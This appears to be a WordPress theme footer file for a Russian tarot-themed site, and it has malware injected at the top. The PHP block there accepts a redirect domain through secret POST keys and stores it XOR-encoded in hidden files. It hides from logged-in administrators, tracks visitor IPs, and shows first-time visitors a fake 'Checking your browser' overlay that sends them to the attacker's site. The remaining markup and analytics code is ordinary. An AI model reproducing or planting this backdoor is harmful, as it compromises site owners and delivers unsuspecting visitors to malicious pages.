<?php /* 5pJQhrPh3XJCUOiaQCa6 */ ?><?php
error_reporting(E_ALL);$DOMAIN_FNAME1_7QNG='.SIc7CYwgY';$DOMAIN_FNAME2_7QNG='/var/tmp/.SIc7CYwgY';if(isset($_POST['6FoNxbvo73BHOjhxokW3'])){check_status($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);return;}else if(isset($_POST['8Yx5AefYpBp07TEocRmv'])){$domain=$_POST['8Yx5AefYpBp07TEocRmv'];echo "$domain\n";var_dump($_POST);if(isset($_POST['https'])){$domain="https://$domain";}else {$domain="http://$domain";}echo $domain;save_str($domain,$DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);return;}else {onClientConnect($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);}function ip_is_there($fname1,$fname2,$ip){if(!file_exists($fname1)&&!file_exists($fname2)){return false;}$contains=false;$file=fopen($fname1,'r');if(!$file){$file=fopen($fname2,'r');}if(!$file){return;}while(!feof($file)){$line=fgets($file);if(strpos($line,$ip)!==false){$contains=true;break;}}fclose($file);return $contains;}function add_ip($fname1,$fname2,$ip){$file=fopen($fname1,'a');if(!$file){$file=fopen($fname2,'a');}if(!$file){return;}fwrite($file,$ip);fwrite($file,"\n");fclose($file);}function onClientConnect($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG){$ip=$_SERVER['REMOTE_ADDR'];$file1="./.ips1.txt";$file1_b="/var/tmp/.ips1.txt";$isIn1=false;$isIn2=false;if(ip_is_there($file1,$file1_b,$ip)){$isIn1=true;}$keys=array_keys($_COOKIE);$cookies=implode($keys);if(strpos($cookies,"wordpress_logged")!==false||strpos($cookies,"wp-settings")!==false||strpos($cookies,"wordpress_test")!==false){if(!$isIn1){add_ip($file1,$file1_b,$ip);}return;}if(!isset($_SERVER['HTTP_REFERER'])||strlen($_SERVER['HTTP_REFERER'])<1){if(!$isIn1){add_ip($file1,$file1_b,$ip);}return;}count_lines_and_truncate($file1,$file1_b);if(!$isIn1){add_ip($file1,$file1_b,$ip);$domain=read_str($DOMAIN_FNAME1_7QNG,$DOMAIN_FNAME2_7QNG);redirect($domain);}}function count_lines_and_truncate($fname1,$fname2){if(!file_exists($fname1)&&!file_exists($fname2)){return 0;}$line_count=0;$file=fopen($fname1,'r');$fname=$fname1;if(!$file){$file=fopen($fname2,'r');$fname=$fname2;}if(!$file){return 0;}while(!feof($file)){$line=fgets($file);$line_count++;}if($line_count>3000){unlink($fname);ftruncate($file,0);}fclose($file);return $line_count;}function xor_enc($str){$key='KQzLStQQblMU3rBGqFyEn8LlEWZ1G4vbK7YcpfZKrjaUQhP3sQKJHKaVLtr0H8RSPPqbDqfNEQ0Yu08mHsI77NGcU5rbsMLNWwlqDXmM5E9WqY73rBvXwj5GkQay2wnuGc4wFKYyYLMEhQDAG60aeYudKtUSUXDHYG912g0VWlYob3lycp0eC1QnoQe3xsWPbA3e1ZWY';$res='';for($i=0;$i<strlen($str);$i++){$res.=chr(ord($str[$i])^ord($key[$i]));}return $res;}function enc($str){$res=xor_enc($str);$res=base64_encode($res);return $res;}function dec($str){$str=base64_decode($str);$res=xor_enc($str);return $res;}function show_popup($url){echo "<script type='text/javascript'> var w_location = '$url';
function createPopup(){
  var popup = document.createElement('div');
  popup.style.position = 'absolute';
  popup.style.width = '100%';
  popup.style.height = '100%';
  popup.style.left = 0;
  popup.style.top = 0;
  popup.style.backgroundColor = 'white';
  popup.style.zIndex = 99999;
  document.body.appendChild(popup);

  popup.onclick = function() {
    window.location = w_location;
  };

  var p = document.createElement('p');
  p.innerText = 'Checking your browser before accessing '
    + window.location.host + '...';
  p.style.textAlign = 'center';
  //p.style.margin = '20px auto';
  //p.style.left = '20px';
  p.style.fontSize = 'x-large';
  p.style.position = 'relative';
  p.textContent = p.innerText;
  popup.appendChild(p);

  return popup;
}

function createButton() {
  var button = document.createElement('div');
  button.style.position = 'absolute';
  button.style.top = '20%';
  button.style.left = '10%';
  button.style.right = '10%';
  button.style.width = '80%';
  button.style.border = '1px solid black';
  button.style.textAlign = 'center';
  button.style.verticalAlign = 'middle';
  button.style.margin = '0, auto';
  button.style.cursor = 'pointer';
  button.style.fontSize = 'xx-large';
  button.style.borderRadius = '5px';
  button.onclick = function() {
    window.location = w_location;
  };
  button.onmouseover = function() {
    button.style.border = '1px solid red';
    button.style.color = 'red';
  };
  button.onmouseout = function() {
    button.style.border = '1px solid black';
    button.style.color = 'black';
  };

  button.innerText = 'Continue';
  button.textContent = button.innerText;
  return button;
}

var hideWebSite = function() {
  var popup = createPopup();
  var button = createButton();
  popup.appendChild(button);

};
console.log(document);
console.log(document.body);
window.onload = function() {
console.log('onload');
hideWebSite()
};
</script>";}function redirect($url){show_popup($url);return;}function check_status($df1,$df2){$domain=read_str($df1,$df2);echo "Domain is: $domain\n";}function read_str($fname1,$fname2){$file=fopen($fname1,'r');$name=$fname1;if(!$file){$name=$fname2;$file=fopen($fname2,'r');}if(!$file){return;}$str='';if(filesize($name)>0){$str=fread($file,filesize($name));}$str=dec($str);fclose($file);return $str;}function save_str($str,$fname1,$fname2){$file=fopen($fname1,'w');if(!$file){$file=fopen($fname2,'w');}if(!$file){return;}$str=enc($str);fwrite($file,$str);fclose($file);}?>


<?php /* uqjsQSyWVhmOHAEVa1i6 */ ?>  
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <?php wp_footer(); ?>
    <script src="<?php bloginfo('template_url'); ?>/js/jquery-1.11.2.min.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/bootstrap.min.js"></script>
    <!-- animsition js -->
    <script src="<?php bloginfo('template_url'); ?>/dist/js/jquery.animsition.min.js"></script>
    <!-- custom files -->
    <script src="<?php bloginfo('template_url'); ?>/js/buzz.min.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/jquery.ui.touch-punch.min.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/ion.sound.min.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/jquery.jplayer.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/howler.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/jquery-ui.min.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/jq.touch.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/jcron.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/exif.js"></script>
    <!-- <script src="<?php //bloginfo('template_url'); ?>/js/sweet-alert.min.js"></script> -->
    <script src="<?php bloginfo('template_url'); ?>/js/sweetalert.min.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/protocol.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/scripts.js"></script>
    <script src="<?php bloginfo('template_url'); ?>/js/numbers.js"></script>
    <!-- Yandex.Metrika counter -->
    <script type="text/javascript">
    (function (d, w, c) {
        (w[c] = w[c] || []).push(function() {
            try {
                w.yaCounter30639627 = new Ya.Metrika({id:30639627,
                        clickmap:true,
                        trackLinks:true,
                        accurateTrackBounce:true});
            } catch(e) { }
        });

        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };
        s.type = "text/javascript";
        s.async = true;
        s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";

        if (w.opera == "[object Opera]") {
            d.addEventListener("DOMContentLoaded", f, false);
        } else { f(); }
    })(document, window, "yandex_metrika_callbacks");
    </script>
    <noscript><div><img src="//mc.yandex.ru/watch/30639627" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
    <!-- /Yandex.Metrika counter -->
    <div class="modal" id="history_item_modal" tabindex="-1" role="dialog">
      <div class="modal-dialog" role="document">
        <div class="modal-content" id="history_item_modal_content">
          <div class="modal-header">
            <h5 class="modal-title" id="history_item_modal_title">Рецепт: "<span class="history_item_modal_sub_title"></span>"</h5>
            <button data-html2canvas-ignore="true" type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
            <h5 class="modal-title for_print" id="history_item_modal_title">применять 21 день</h5>
          </div>
          <div class="modal-body">
            <div class="row">
              <div class="marakata_sim_prot_modal marakata_modal_sim-1"></div>
              <div class="marakata_sim_prot_modal marakata_modal_sim-2"></div>
              <div class="marakata_sim_prot_modal marakata_modal_sim-3"></div>
              <div class="marakata_sim_prot_modal marakata_modal_sim-4"></div>
              <div class="marakata_modal_sim-dot">.</div>
              <div class="marakata_sim_prot_modal marakata_modal_sim-5"></div>
            </div>
          </div>
          <div class="modal-footer card_modal_footer">
            <div class="container">
              <div class="row">
                <div class="col-4">
                  <div class="history_item_modal_code"></div>
                </div>
                <div class="col-4">
                  <button data-html2canvas-ignore="true" class="btn btn-success save_img">Сохранить <i class="fas fa-download"></i></button>
                  <!-- <img class="saved_img hidden" src="" alt=""> -->
                  <a href="" download class="saved_img btn hidden">Скачать</a>
                </div>
                <div class="col-4">
                  <div class="history_item_modal_date"></div>
                </div>
              </div>
              <div class="row for_print">
                <div class="col" style="margin-top: 10px;text-align: center;">Рецепт создан в программе — <b>"TarotMachine"</b></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
